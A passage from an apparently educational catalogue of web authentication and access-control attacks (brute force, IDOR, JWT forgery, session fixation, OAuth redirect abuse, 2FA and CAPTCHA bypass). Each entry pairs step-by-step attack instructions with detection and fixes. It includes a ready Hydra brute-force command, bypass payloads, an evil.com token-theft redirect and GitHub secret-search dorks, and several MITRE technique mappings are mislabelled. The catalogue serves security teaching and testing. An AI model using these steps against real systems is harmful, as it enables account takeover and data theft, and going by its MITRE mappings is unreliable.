- **Attack Steps**: Step 1: Identify the login form on the target web app. Step 2: Use a tool like Hydra with a command like hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:Invalid login" to try common passwords. Step 3: Monitor responses for successful login indication (status code 200 with dashboard, absence of "Invalid password", etc.). Step 4: Burp Suite Intruder can also be used to test password fields with hundreds of values. Step 5: If no account lockout or CAPTCHA occurs, continue until a correct password is found. Step 6: This confirms missing rate limiting and makes brute force viable. Always test on your own lab setup or legal targets.
- **Detection**: Monitor excessive login attempts from single IPs or accounts
- **Solution**: Enforce rate-limiting, CAPTCHA, and temporary account lockouts after failed attempts
- **Tags**: Brute Force, No Rate Limiting, Password Guessing

## Logic Flaws in Authentication Code

- **Attack Type**: Authentication Logic Bypass
- **Target**: Web Login / Token-Based Auth
- **Vulnerability**: Broken logic, flawed conditionals
- **MITRE**: T1649 – Modify Authentication Process
- **Impact**: Full bypass of authentication via bad coding
- **Tools**: Browser, DevTools, Burp Suite
- **Scenario**: Developers implement insecure logic like if(password == true) or token checks that always evaluate true, granting access without proper verification.
- **Attack Steps**: Step 1: Try accessing the login endpoint with crafted parameters. In some misconfigured sites, you can send JSON payloads like { "user": "admin", "password": true } or malformed headers that bypass logic checks. Step 2: If the backend code is checking something like if(password) or if(password == true), it may treat any input as valid and let the attacker in. Step 3: Send variations of the request (e.g., empty password, 1==1, true, etc.) using Burp Repeater or Postman. Step 4: If you’re redirected to a dashboard or admin view, authentication logic is flawed. Step 5: This is dangerous and often unnoticed unless manually tested. Use test apps like bWAPP to experiment with such bypasses.
- **Detection**: Perform logic validation in code audit; detect anomalous logins with empty or malformed input
- **Solution**: Validate input strictly, do not use truthy checks in sensitive auth paths (e.g., always use strong validation logic)
- **Tags**: Logic Bypass, Authentication Flaws

## URL Path Manipulation

- **Attack Type**: Direct Object Reference Bypass
- **Target**: Web App Paths, REST APIs
- **Vulnerability**: Insecure Direct Object Reference (IDOR)
- **MITRE**: T1203 – Exploitation for Privilege Escalation
- **Impact**: Unauthorized resource access via URL tweaking
- **Tools**: Browser, Burp Suite, Fiddler
- **Scenario**: Attackers manipulate URL paths to access restricted resources, like /admin, /user/1/edit, bypassing frontend controls.
- **Attack Steps**: Step 1: Log in as a normal user on a web app. Step 2: Note the current URL (e.g., /user/5/profile). Step 3: Try changing the URL to another user's ID (e.g., /user/1/profile, /admin/dashboard, or /settings/admin). Step 4: If the app doesn’t validate user permissions server-side, the page may load and give unauthorized access. Step 5: Try accessing unauthorized HTTP verbs too (e.g., PUT/DELETE on /user/1). Step 6: If successful, you’ve discovered insecure direct object references (IDOR). Step 7: Tools like Burp Suite can be used to automate ID discovery using the Sequencer or Intruder. Step 8: Report any success—this flaw is critical in real-world apps. Test in safe labs like Juice Shop or DVWA.
- **Detection**: Monitor access to resources outside authenticated user's scope
- **Solution**: Enforce permission checks on server side, not just client; use access control filters per route
- **Tags**: URL Manipulation, IDOR, Path Tampering

## Parameter Pollution

- **Attack Type**: HTTP Parameter Pollution (HPP)
- **Target**: Web Forms, URLs, APIs
- **Vulnerability**: Inconsistent parameter parsing
- **MITRE**: T1190 – Exploit Public-Facing App
- **Impact**: Role escalation, access to restricted views
- **Tools**: Burp Suite, Browser Dev Tools
- **Scenario**: Attackers send duplicate parameters in HTTP requests (e.g., two role= fields), tricking server logic to execute bypass behavior or ignore real input.
- **Attack Steps**: Step 1: Identify a login or role-based function where parameters like role=admin, access=true, or user=1 are used in URLs or forms. Step 2: In Burp Suite or manually, modify the request to include duplicate fields, like GET /dashboard?role=user&role=admin. Step 3: Depending on the backend parser (e.g., PHP uses the first, Node.js may use the last), the server may parse the role as admin even if frontend passed user. Step 4: Submit this crafted request. If the server responds with elevated access or a different page than expected, the attack succeeded. Step 5: Test POST forms too by duplicating fields in the request body: role=user&role=admin. Step 6: This is common in older PHP/Java apps that fail to validate the exact parameter. This trick can bypass logic validation, especially on RBAC systems. Test on DVWA or Juice Shop.
- **Detection**: Monitor requests with duplicate parameters; validate only expected values server-side
- **Solution**: Sanitize all inputs; reject multiple instances of sensitive parameters; enforce strong server-side validation
- **Tags**: HPP, Role Escalation, Input Manipulation

## Session Fixation

- **Attack Type**: Session Hijacking
- **Target**: Session-based Login Apps
- **Vulnerability**: Reuse of session across users
- **MITRE**: T1078.002 – Web Session Cookie
- **Impact**: Full session hijack, unauthorized access
- **Tools**: Browser, Burp Suite, Email link
- **Scenario**: The attacker sets or sends a predefined session ID, and forces the victim to use it, so attacker can hijack the session after login.
- **Attack Steps**: Step 1: Attacker accesses the web application and obtains a valid session ID (from a cookie like PHPSESSID=abcd1234). Step 2: They craft a URL like http://victimsite.com/login?sessionid=abcd1234 or inject the session via a link with a pre-set cookie. Step 3: Send this link to the victim (via phishing, email, XSS, etc.). Step 4: If the server accepts the preset session ID and binds it after login, the victim logs in using the attacker’s session ID. Step 5: After the victim logs in, attacker reuses the same session ID to access the account as if they were the user. Step 6: This only works if the application does not generate a new session ID after login. Step 7: Test this on vulnerable test apps or old PHP-based apps. In modern secure apps, session ID should be regenerated after login.
- **Detection**: Monitor reused session IDs and logins with identical session across users
- **Solution**: Regenerate session ID post-login; prevent preset session cookies from being accepted
- **Tags**: Session Hijack, Fixation, Authentication

## Token Prediction / Insecure JWT

- **Attack Type**: JWT None Bypass / Weak Token Signing
- **Target**: JWT Token-Based Apps
- **Vulnerability**: Insecure token handling or validation
- **MITRE**: T1606.001 – JWT Manipulation
- **Impact**: Role escalation, account takeover, auth bypass
- **Tools**: JWT.io Debugger, Burp Suite, Postman
- **Scenario**: Poorly configured JWT tokens use alg=none or predictable secrets. Attackers can forge or tamper JWTs to become admin or access unauthorized data.
- **Attack Steps**: Step 1: Capture a valid JWT token from the browser (look in dev tools → Application tab → Cookies / Local Storage). Tokens look like header.payload.signature. Step 2: Decode the JWT at jwt.io. If you see alg: none or symmetric signing (HS256) with weak secrets like admin, proceed. Step 3: Modify the payload to set "admin": true or "role": "admin". Step 4: Set alg: none in the header or use a guessed secret in HS256 to resign the token using jwt.io or code. Step 5: Replace the JWT in the browser with your forged token (use dev tools or cookie editor extension). Step 6: Refresh the page. If the app does not verify token properly, it grants admin access. Step 7: Try tokens with predictable user IDs (user_id=1) or brute-force weak signing keys if needed. Step 8: Always test on legal JWT labs like JWT Debugger, PortSwigger's JWT lab, or local DVWA.
- **Detection**: Log abnormal claims in tokens; detect tokens signed with none or with altered headers
- **Solution**: Never use none; use RS256 with key rotation; verify JWTs strictly on server
- **Tags**: JWT Bypass, Token Forgery, None Algorithm

## Exposed API Keys or Tokens

- **Attack Type**: Hardcoded Secret Disclosure
- **Target**: JS Files, Repos, APIs
- **Vulnerability**: Secret leakage in frontend or VCS
- **MITRE**: T1552 – Unsecured Credentials
- **Impact**: Unauthorized access to protected APIs or systems
- **Tools**: GitHub, Browser Dev Tools, JS Parser
- **Scenario**: Developers accidentally expose API keys, auth tokens, or secrets in client-side code (JS), repositories, or URLs, which attackers use to gain access.
- **Attack Steps**: Step 1: Open the website and view the source code (Right Click → View Page Source) or inspect via browser dev tools (Network → JS files). Step 2: Look for hardcoded API keys, tokens, or secrets in JS files, especially those ending in .config.js, env.js, or included from external CDNs. Step 3: Try the key in API requests. For example, use curl or Postman with headers like Authorization: Bearer <API_KEY>. Step 4: Alternatively, search GitHub using queries like filename:.env SECRET_KEY or token to find exposed keys accidentally pushed by developers. Step 5: If valid, these keys can be used to access third-party services like Firebase, AWS, or internal APIs without login. Step 6: Responsible disclosure is recommended. This is one of the most common real-world security mistakes. Test on your own apps or in HackTheBox / TryHackMe challenges.
- **Detection**: Scan JS files and repositories for secrets; use DAST/SAST tools like TruffleHog or Gitleaks
- **Solution**: Avoid placing secrets in frontend; use environment variables; rotate leaked tokens immediately
- **Tags**: API Key Exposure, Secret Leak, Hardcoded Token

## Password Reset Abuse

- **Attack Type**: Token Reuse / Weak Reset Verification
- **Target**: Password Reset Forms
- **Vulnerability**: Predictable tokens, missing expiration
- **MITRE**: T1606.002 – Token Manipulation
- **Impact**: Account takeover, privilege escalation
- **Tools**: Browser, Burp Suite, curl, Email Client
- **Scenario**: Many apps allow reuse of password reset tokens, guessable tokens, or fail to verify identity strictly, allowing attackers to reset passwords of other users.
- **Attack Steps**: Step 1: Find the “Forgot Password” feature in the target application. Step 2: Enter a valid email or username (yours or test one) and observe the reset link sent (check email or use mail capture tools). Step 3: Try reusing the token multiple times – if the token remains valid after use, it’s a token reuse vulnerability. Step 4: Try tampering with the reset URL (e.g., changing uid=123 to uid=1) if user ID is exposed in the link. Step 5: Test if reset tokens are predictable (e.g., base64-encoded or sequential). Step 6: For apps not verifying prior authentication, try requesting a reset for another user and intercept/change email param using Burp. Step 7: If password reset succeeds without ownership of email account or token reuse works, the attack succeeded. Always test on allowed platforms (like DVWA, PortSwigger).
- **Detection**: Log reuse of tokens; monitor multiple reset requests for same token
- **Solution**: Invalidate tokens after use; add expiration; verify identity strictly before reset
- **Tags**: Token Reuse, Reset Abuse, Account Takeover

## SSO / OAuth Misuse

- **Attack Type**: OAuth Flow Tampering / Token Swapping
- **Target**: OAuth Login Flows
- **Vulnerability**: Insecure redirect, token trust issues
- **MITRE**: T1557 – Adversary-in-the-Middle
- **Impact**: User impersonation, account hijack
- **Tools**: Burp Suite, OAuth Debugger, Postman
- **Scenario**: Improper OAuth implementation lets attackers intercept, forge, or replay tokens to impersonate users or switch identities.
- **Attack Steps**: Step 1: Visit a web app using OAuth-based login (e.g., Login with Google/Facebook). Step 2: During login, intercept the request using Burp Suite and inspect parameters like redirect_uri, code, state. Step 3: Modify redirect_uri to point to your domain or tamper with state to see if CSRF protections are weak. Step 4: Check for ID token disclosure in URL or response. Decode it via jwt.io. Step 5: If tokens can be reused or sent to attacker’s controlled endpoint, you can forge login by using code/token issued for someone else. Step 6: In vulnerable flows, attackers can modify the response to log in as the victim without owning their credentials. Step 7: You may also test OAuth phishing by crafting malicious auth links if the target fails to verify redirect domain properly. Practice on PortSwigger's OAuth Labs.
- **Detection**: Monitor OAuth token reuse and mismatched redirect URIs; validate state and origin headers
- **Solution**: Validate redirect_uri, enforce state param, never accept none as alg for ID token
- **Tags**: OAuth Exploit, SSO Tampering, Token Replay

## Cookie Manipulation

- **Attack Type**: Privilege Escalation via Cookie Edit
- **Target**: Cookie-Based Sessions
- **Vulnerability**: Trusting client-side cookie values
- **MITRE**: T1070.006 – Trusted Cookie Modification
- **Impact**: Privilege escalation, unauthorized access
- **Tools**: Browser Dev Tools, Cookie Editor
- **Scenario**: Attackers modify browser cookies to escalate privileges (e.g., role=user to role=admin) if cookies are not verified server-side.
- **Attack Steps**: Step 1: Log in as a regular user. Open browser dev tools → Application tab → Cookies. Step 2: Look for any fields like role=user, isAdmin=false, or other modifiable content. Step 3: Modify values in-place, e.g., change role=user → role=admin. Step 4: Refresh the page or access a protected area like /admin. Step 5: If access is granted, it means cookie values are trusted blindly by the server (bad practice). Step 6: Also test by modifying JWTs in cookies if present. If tokens are not signed properly, altering them can lead to privilege gain. Step 7: For more automation, use Burp Suite to intercept and modify cookie headers in real-time. Step 8: Always test in labs like Juice Shop or bWAPP where cookie manipulation is designed to be explored.
- **Detection**: Alert on access attempts with manipulated cookie values or mismatched session roles
- **Solution**: Sign cookies with HMAC; validate on server; never trust client-set roles or access flags
- **Tags**: Cookie Tampering, Role Escalation, Auth Bypass

## Open Redirect → Auth Bypass

- **Attack Type**: Redirection Abuse to Hijack Auth Flow
- **Target**: Login Pages, OAuth Flows
- **Vulnerability**: Open Redirect with token leakage
- **MITRE**: T1071.001 – Application Layer Protocol
- **Impact**: Token theft, session hijack, phishing-based login bypass
- **Tools**: Burp Suite, Redirect Scanner
- **Scenario**: Open redirect bugs are used in OAuth or login flows to redirect tokens or credentials to attacker-controlled sites, leading to login bypass or hijack.
- **Attack Steps**: Step 1: Locate any login or SSO-based auth process where a redirect_uri or next parameter is used. Example: /login?next=https://target.com/dashboard. Step 2: Change the next or redirect_uri to point to your domain: /login?next=https://evil.com. Step 3: If the server redirects without validating the domain, an attacker can use this in phishing. Step 4: In OAuth flows, if redirect_uri points to a malicious site, the auth code or token can be leaked to the attacker. Step 5: Once the victim logs in, they get redirected to the attacker’s site with a token in URL, which the attacker captures. Step 6: This leads to session hijack or login bypass in apps that blindly trust tokens. Step 7: To confirm, check browser URL after redirection — if it contains sensitive data sent to your domain, the attack succeeded. Use PortSwigger labs to safely practice this.
- **Detection**: Log and block redirections to untrusted domains; monitor URL parameters with external domains
- **Solution**: Whitelist redirect domains; use short-lived tokens; avoid sending sensitive data via URL
- **Tags**: Open Redirect, OAuth Abuse, Auth Token Leak

## Bypass via Alternative Endpoint

- **Attack Type**: Legacy Endpoint Abuse
- **Target**: REST API / Legacy Web Auth
- **Vulnerability**: Deprecated endpoint still accessible
- **MITRE**: T1190 – Exploit Public-Facing App
- **Impact**: Authentication bypass, old session grants access
- **Tools**: Browser, Burp Suite, Postman
- **Scenario**: Older or deprecated authentication APIs like /auth_v1 remain active, allowing attackers to bypass updated secure auth mechanisms.
- **Attack Steps**: Step 1: While testing login flow, explore network requests and endpoints like /api/auth, /v1/login, /legacy/auth, etc. Step 2: Attempt to access legacy endpoints using old login formats (e.g., JSON body with username and password). Step 3: If deprecated endpoints still work and lack new protections (e.g., 2FA, rate-limiting), the attacker can log in using just credentials. Step 4: If the old endpoint gives a session token or JWT, use it to access secure parts of the site. Step 5: You’ve bypassed modern authentication by targeting unpatched legacy APIs. Step 6: Always check Swagger docs, JS files, or browser dev tools for hidden or forgotten API paths. Step 7: Confirm the app doesn’t invalidate tokens from old endpoints. Use this test only on legal test environments (e.g., Juice Shop).
- **Detection**: Log usage of legacy endpoints; flag outdated versions in API gateway
- **Solution**: Remove legacy endpoints or fully wrap in secure authentication checks; version authentication tokens
- **Tags**: Legacy API, Insecure Endpoint, Deprecated Auth

## Unverified Email / Account Activation

- **Attack Type**: Email Verification Logic Flaw
- **Target**: Signup Forms / Web Auth
- **Vulnerability**: Missing enforcement of email verification
- **MITRE**: T1585 – Account Creation Abuses
- **Impact**: Fake accounts, spam registrations, automated abuse
- **Tools**: Browser, Temporary Email, Burp Suite
- **Scenario**: Some apps allow full account usage immediately after signup, without verifying the user’s email address, allowing fake accounts or abuse.
- **Attack Steps**: Step 1: Register a new account using a fake or temporary email address (e.g., from temp-mail.org). Step 2: After submission, check whether the app lets you log in or access dashboard before clicking the verification link. Step 3: If access is allowed, the app fails to enforce verification properly. Step 4: Try to perform actions like comment posting, profile updates, or product orders — anything that shouldn't be available without email verification. Step 5: If the app allows usage, you’ve confirmed the flaw. Step 6: This can be abused by bots to mass-create fake accounts, spam systems, or bypass account validation. Step 7: Always test responsibly on platforms meant for practice or use bug bounty platforms with scope.
- **Detection**: Log accounts that take actions without email_verified=true; alert on disposable domain usage
- **Solution**: Block login until email is confirmed; use strong domain filters; delay access until verified
- **Tags**: Email Bypass, Unverified Account, Spam Abuse

## 2FA Misconfiguration

- **Attack Type**: Logic Flaw in Second Factor Logic
- **Target**: 2FA-Protected Web Apps
- **Vulnerability**: Incomplete or faulty 2FA flow
- **MITRE**: T1556.004 – Multi-Factor Authentication Abuse
- **Impact**: MFA bypass, account takeover, insecure auth completion
- **Tools**: Browser, Burp Suite, Proxy Extension
- **Scenario**: Misconfigured or partially enforced 2FA allows attackers to bypass MFA or reuse old sessions to avoid 2FA completely.
- **Attack Steps**: Step 1: Try logging into an account that has 2FA enabled. Step 2: After entering correct username and password, intercept the request before OTP entry. Step 3: Modify request to skip OTP (e.g., change URL from /2fa to /dashboard, or remove OTP field and replay). Step 4: In some misconfigured apps, session gets created during password phase — and skipping OTP doesn't invalidate it. Step 5: Try using session cookies received before completing 2FA and manually access secure areas. Step 6: If allowed in, the system has a logic flaw — it lets users in without OTP enforcement. Step 7: Also check for backup codes or remember-device flows that don’t validate origin. Step 8: Use labs like PortSwigger 2FA Bypass to simulate this attack in a safe environment.
- **Detection**: Monitor login sessions with missing OTP status; alert on dashboard access without 2FA completion
- **Solution**: Bind session activation only after OTP completion; reverify on privilege changes; validate MFA on every login session
- **Tags**: MFA Bypass, 2FA Logic Flaw, Session Reuse

## OAuth Token Reuse

- **Attack Type**: Access Token Replay / Theft
- **Target**: OAuth-Integrated Web Apps
- **Vulnerability**: Tokens not bound to session/device
- **MITRE**: T1528 – Steal or Forge Authentication Token
- **Impact**: Persistent impersonation, token theft
- **Tools**: Browser Dev Tools, Postman, Burp
- **Scenario**: OAuth tokens that are not bound to a device or session can be reused if intercepted, cached, or leaked — enabling impersonation.
- **Attack Steps**: Step 1: Complete a login via OAuth (e.g., Google/Facebook login) and capture the access token issued (usually available in Authorization: Bearer <token> headers). Step 2: Use this token in Postman to manually access protected APIs. Step 3: If tokens are long-lived and not device-bound, reusing them from another browser/device should work. Step 4: Simulate token reuse by copying token from one session to another — if accepted, system is vulnerable. Step 5: Try stealing the token via exposed local storage or cached files (e.g., in browser dev tools). Step 6: If application doesn’t detect that token is used in two locations, impersonation is possible. Step 7: Try expired tokens too — some APIs accept them due to missing expiry enforcement. Step 8: Test on platforms like bWAPP or test OAuth playgrounds.
- **Detection**: Monitor multiple IPs using same token; invalidate on duplicate use; enforce token expiration
- **Solution**: Bind tokens to session/device/fingerprint; rotate tokens frequently; use short lifespans
- **Tags**: Token Replay, OAuth Reuse, Impersonation

## CAPTCHA Bypass

- **Attack Type**: CAPTCHA Evasion / Weak Validation
- **Target**: Web Forms with CAPTCHA
- **Vulnerability**: Client-side only CAPTCHA, weak logic
- **MITRE**: T1203 – Exploitation of Application Logic
- **Impact**: Automated abuse, credential stuffing, fake registrations
- **Tools**: Browser, Burp Suite, OCR Tools, Selenium
- **Scenario**: CAPTCHA mechanisms can be bypassed using automation, poor validation, or predictable answers (e.g., math CAPTCHA with no server check).
- **Attack Steps**: Step 1: Identify forms protected by CAPTCHA (e.g., login, signup, feedback). Step 2: Submit the form with any value in CAPTCHA field and inspect server response. Step 3: If CAPTCHA is validated only on client side (JavaScript), disable JavaScript and resubmit the form — if accepted, it's bypassed. Step 4: Use Burp Suite to intercept request and remove CAPTCHA field — if the server doesn't throw an error, it ignores it. Step 5: Try automated scripts using Selenium or Puppeteer to read simple math CAPTCHAs (e.g., "What is 2 + 3?"). Step 6: Use OCR tools or CAPTCHA-solving APIs like 2Captcha for image-based ones. Step 7: If submission is successful repeatedly without solving CAPTCHA, the mechanism is bypassed. Step 8: Test in labs like OWASP Juice Shop which have intentional CAPTCHA weaknesses.
- **Detection**: Monitor repeated form submissions without correct CAPTCHA validation
- **Solution**: Validate CAPTCHA server-side; use rate limits; enforce IP reputation or behavioral analytics
- **Tags**: CAPTCHA Bypass, Form Abuse, Bot Protection Weakness

## Direct Object Reference Manipulation (IDOR)

- **Attack Type**: ID-based Access Manipulation
- **Target**: Web URLs, APIs
- **Vulnerability**: Missing access control on ID references
- **MITRE**: T1557 – Man-in-the-Middle
- **Impact**: Unauthorized data access
- **Tools**: Browser, Burp Suite
- **Scenario**: Attackers change numeric or string-based IDs in URLs or API requests to access resources they don’t own (e.g., user_id=1 → user_id=2).
- **Attack Steps**: Step 1: Log in as a regular user in any web app (like a profile dashboard). Step 2: In the browser URL or network request, look for IDs related to your account — e.g., /user/123/profile, invoice?id=456, order=789. These IDs usually represent a user, file, or account. Step 3: Change the number in the URL to something else — like /user/2/profile or order=1. Step 4: Press Enter and observe. If you are able to view or download someone else’s profile, invoice, or data, then IDOR exists. Step 5: Test this for GET, POST, and PUT requests in browser or using Burp Suite. Step 6: Also try this on mobile apps via proxies. If there is no permission check and the ID fetches unauthorized content, the attack succeeded. Step 7: Practice this safely in DVWA, Juice Shop, or bWAPP. Step 8: Never test this without permission — always follow legal lab practice.
- **Detection**: Log resource access per user; flag mismatched user/resource IDs
- **Solution**: Enforce ownership checks server-side; never trust client IDs
- **Tags**: IDOR, Access Bypass, Insecure API

## Missing Authorization Checks in APIs

- **Attack Type**: Broken Access Control on Endpoints
- **Target**: APIs / Microservices
- **Vulnerability**: No permission checks on endpoints
- **MITRE**: T1190 – Exploit Public-Facing App
- **Impact**: Unauthorized access, data leakage
- **Tools**: Postman, Browser Dev Tools, Burp Suite
- **Scenario**: APIs often expose data or actions without checking if the user is authorized to access them — attackers can call internal APIs directly.
- **Attack Steps**: Step 1: Log in to the app and inspect any actions you perform (e.g., change password, delete account, download invoice) using browser’s developer tools (F12 → Network tab). Step 2: Capture the API call that performs the action — it could be a POST or GET request to something like /api/delete, /api/invoice/123. Step 3: Log out or create a lower-privileged account (e.g., guest). Step 4: Replay the same request using Burp or Postman. If the action works even when you’re not authenticated or not privileged, the API is missing proper authorization. Step 5: Try modifying headers like Authorization: Bearer <token> or removing them. If the API still responds with data or performs the action, the attack is successful. Step 6: This often happens in mobile or single-page apps where frontend checks are present, but backend APIs are exposed. Step 7: This is a real-world issue — test in safe platforms only like OWASP Juice Shop or HackTheBox.
- **Detection**: Log unauthenticated API calls; monitor API access by role
- **Solution**: Apply authentication + role-based checks in all API layers
- **Tags**: Broken Access Control, Insecure API, Logic Flaw

## Insecure Role Enforcement (Privilege Escalation)

- **Attack Type**: Role Escalation by Modifying User Role
- **Target**: Role-based Access Apps
- **Vulnerability**: Trusting client-supplied roles
- **MITRE**: T1078.004 – Privilege Escalation
- **Impact**: Gain admin or elevated access
- **Tools**: Browser Dev Tools, Burp Suite
- **Scenario**: Some applications allow users to modify their own role or permissions (e.g., change role=user to role=admin) either in cookie, API, or browser request.
- **Attack Steps**: Step 1: Log in as a normal user and open browser dev tools → Storage tab → Cookies or Local Storage. Step 2: Look for any values like "role":"user" or "admin":false. Step 3: Change "user" to "admin" or "false" to "true" and save the value. Step 4: Refresh the page or try accessing an admin-only section (/admin or Settings). Step 5: If the app grants admin access, the role check is done only on client side and not verified on the server — a serious flaw. Step 6: Also inspect network requests using Burp. If API requests contain roles in the body or headers (e.g., X-Role: user), try changing that to admin. Step 7: If the server accepts and grants higher privileges, you’ve confirmed a privilege escalation issue. Step 8: Practice this on DVWA and Juice Shop (where role = admin changes work in some challenges). Step 9: Never test on live systems without permission.
- **Detection**: Monitor abnormal privilege change patterns; detect role headers in client requests
- **Solution**: Enforce role checks server-side; never allow client to dictate access level
- **Tags**: Role Escalation, Privilege Bypass, Access Control Flaw

## Unlinked but Accessible Admin Panels

- **Attack Type**: Hidden Admin Interface Discovery
- **Target**: Admin Panels / Dashboards
- **Vulnerability**: No authentication on internal admin URLs
- **MITRE**: T1595 – Active Scanning
- **Impact**: Full admin access, sensitive data leakage
- **Tools**: Browser, dirsearch, gobuster, Burp Suite
- **Scenario**: Some admin panels are not linked in the UI but are still accessible if guessed or discovered, and they don’t enforce proper authentication or role checks.
- **Attack Steps**: Step 1: While using the web application, try guessing hidden pages like /admin, /superadmin, /panel, /dashboard, /manage. Many apps leave these unlinked but accessible. Step 2: Use browser to try visiting each guessed URL directly — e.g., go to example.com/admin. Step 3: If a login prompt appears, try default creds like admin:admin, admin:1234, test:test. Step 4: If the page opens without login or with weak auth, it's vulnerable. Step 5: Use tools like dirsearch or gobuster to brute-force and discover hidden paths. Step 6: Check robots.txt — developers often list hidden paths like /private_admin there. Step 7: Once found, try viewing or interacting with the panel. If no checks are in place (e.g., you’re logged in as user but can view admin panel), then it’s an authorization flaw. Step 8: This is one of the most common real-world oversights. Try on Juice Shop or DVWA where hidden panels are intentionally left open.
- **Detection**: Scan access to known admin paths from non-admin users
- **Solution**: Add authentication & role checks to every panel and path, even if hidden
- **Tags**: Hidden Admin, Weak Panel Auth, Directory Discovery

## Forced Browsing / Hidden Resource Access

- **Attack Type**: Accessing Unlinked or Restricted URLs
- **Target**: Hidden URLs / Admin Pages
- **Vulnerability**: Missing authorization checks on protected paths
- **MITRE**: T1610 – Exposed Access Point
- **Impact**: Sensitive data access, dashboard exposure
- **Tools**: Browser, Burp Suite, dirsearch
- **Scenario**: Attackers access resources not linked in the UI but still accessible directly via URL (e.g., /billing, /admin, /export, etc.) due to missing access control.
- **Attack Steps**: Step 1: Log in as a regular user in any web app. Step 2: In the address bar, try directly visiting paths like /admin, /internal, /dashboard, /config, /users, /superadmin. These are common hidden pages. Step 3: If the server doesn’t return a “403 Forbidden” or login page and instead shows sensitive content, you’ve found a forced browsing vulnerability. Step 4: To automate this, use tools like dirsearch or gobuster to scan and discover hidden paths. Step 5: If these resources are accessible without proper authentication or role validation, it’s a serious flaw. Step 6: You can also try brute-forcing filenames like backup.zip, db.sqlite, or adminpanel.html. Step 7: If such files are downloadable or browsable, report it or log it if you’re in a lab setup like DVWA or Juice Shop. Step 8: This happens when security is only through obscurity — the page exists, but isn’t linked in the menu.
- **Detection**: Monitor access to sensitive endpoints by low-privileged users
- **Solution**: Protect all endpoints with role-based checks; do not rely on URL hiding only
- **Tags**: Forced Browsing, Hidden Panel, URL Discovery

## Vertical Privilege Escalation

- **Attack Type**: Low-privileged user performing admin tasks
- **Target**: Role-Based Systems
- **Vulnerability**: Server not validating role level before action
- **MITRE**: T1068 – Exploitation for Privilege Escalation
- **Impact**: Unauthorized admin access or critical function misuse
- **Tools**: Browser, Burp Suite, Postman
- **Scenario**: A regular user changes parameters or URLs to access functions meant only for admins, such as deleting users or changing roles.
- **Attack Steps**: Step 1: Log in as a normal user. Open browser dev tools or intercept requests via Burp. Step 2: Try to perform actions meant for admins — such as modifying users, accessing reports, deleting records. Step 3: Look at the API request or form data. You might see something like role=user or action=delete&id=5. Step 4: Modify the request to elevate action — e.g., change role=user to role=admin, or access an admin endpoint like /admin/deleteUser?id=2. Step 5: If the app allows this request without checking your role on the server, you’ve achieved vertical privilege escalation. Step 6: Also test if you can change your own role in profile settings or request body. Step 7: You can use Juice Shop or DVWA to practice — they let you access admin-level functions as user for learning. Step 8: This works when access control is incomplete or missing entirely.
- **Detection**: Log all role mismatch actions; block access where roles don't match endpoint
- **Solution**: Always verify user role server-side; block low users from accessing sensitive functions
- **Tags**: Vertical Escalation, Role Abuse, Access Control Flaw

## Horizontal Privilege Escalation

- **Attack Type**: Same-role user accessing another user's data
- **Target**: Multi-User Web Apps
- **Vulnerability**: No ownership validation on resource requests
- **MITRE**: T1081 – Credentials in Files
- **Impact**: User data exposure, unauthorized actions
- **Tools**: Browser, Burp Suite, Dev Tools
- **Scenario**: Users at the same permission level (e.g., two normal users) access each other's data by changing user IDs or object references.
- **Attack Steps**: Step 1: Log in as a basic user and go to a page like profile, invoice, or order history — example URL: /invoice?id=202. Step 2: Change the ID in the URL to a different one: /invoice?id=203 and refresh. Step 3: If the page shows data that belongs to another user, the app is not checking whether the resource belongs to you — a horizontal privilege escalation flaw. Step 4: Try doing the same in POST requests by intercepting form submissions or API calls. Step 5: Also test messages (/chat/5) or uploaded files (/file/33) to see if you can view, delete, or edit others’ content. Step 6: If successful, the app lacks proper object ownership checks. Step 7: You can test this in DVWA under the "Insecure Direct Object Reference (IDOR)" tab — it’s a built-in example. Step 8: This kind of issue is extremely common in real-world bug bounty findings.
- **Detection**: Monitor user ID and object ID mapping; alert on access to mismatched records
- **Solution**: Check resource ownership server-side before processing requests
- **Tags**: Horizontal Escalation, User Data Access, IDOR

## Access Control via Client-side Enforcement Only

- **Attack Type**: Hidden Buttons / JS-Based Access Control
- **Target**: Web Dashboards
- **Vulnerability**: Relying on frontend for access control
- **MITRE**: T1203 – Application Layer Exploitation
- **Impact**: Admin or restricted function access by regular user
- **Tools**: Browser, Browser Dev Tools
- **Scenario**: Some applications hide admin functions in the frontend, assuming users won’t find or trigger them — but attackers can enable them manually via dev tools.
- **Attack Steps**: Step 1: Log in as a normal user. Go to the dashboard or settings page and open browser developer tools (press F12). Step 2: Inspect the HTML or JavaScript for hidden buttons, disabled elements, or comments like <!-- admin link -->. Step 3: Use browser tools to unhide or enable these UI elements — e.g., remove disabled from a button, or change display: none in CSS to block. Step 4: Click the now-visible button or follow the unlinked URL. Step 5: If the server performs the admin action (e.g., deleting user, updating settings) even though you're not an admin, the access control was only done on the client (bad). Step 6: Also inspect JavaScript for if (user == "admin") logic — attackers can change that via dev tools. Step 7: If this logic isn't validated server-side, users can abuse any hidden feature. Step 8: You can simulate this in OWASP Juice Shop where buttons can be made visible and functions still work.
- **Detection**: Monitor actions triggered by non-admins; detect abuse of hidden UI elements
- **Solution**: Always enforce authorization checks on the server regardless of client UI visibility
- **Tags**: Client-Side Enforcement, UI Tampering, DOM Exploit

## Session Reuse / Session Hijack for Access

- **Attack Type**: Cookie / Session Token Theft & Reuse
- **Target**: Web Sessions / Auth Tokens
- **Vulnerability**: No binding of session to user/device or IP
- **MITRE**: T1071 – Application Layer Protocol
- **Impact**: Account takeover, full impersonation
- **Tools**: Browser, Burp Suite, Cookie Editor
- **Scenario**: Attacker steals or reuses someone else's session cookie to impersonate them and gain access without logging in.
- **Attack Steps**: Step 1: Log in as a user and open browser developer tools → go to Application > Cookies tab. Copy the session cookie (e.g., PHPSESSID, JSESSIONID, or JWT). Step 2: Open a private/incognito window or different browser. Step 3: Go to the target website but do not log in. Step 4: Use Cookie Editor extension or dev tools to paste the stolen cookie into the new browser session. Refresh the page. Step 5: If you are now logged in as the other user (even without entering a password), session hijacking worked. Step 6: This also happens when cookies are reused (session fixation) — e.g., an attacker shares a link with a known session ID to a victim and waits for them to log in, then hijacks that session. Step 7: If the app allows login from multiple IPs using the same session or fails to expire reused tokens, the issue persists. Step 8: Practice in DVWA or Juice Shop (cookie-based login) for safe testing. Step 9: Never try this on real apps without permission.
- **Detection**: Monitor duplicate session usage from different devices; alert on reused cookies
- **Solution**: Bind sessions to IP/User-Agent; rotate session tokens on login; implement secure, HttpOnly, SameSite cookie flags
- **Tags**: Session Hijack, Cookie Theft, Fixation, Token Reuse

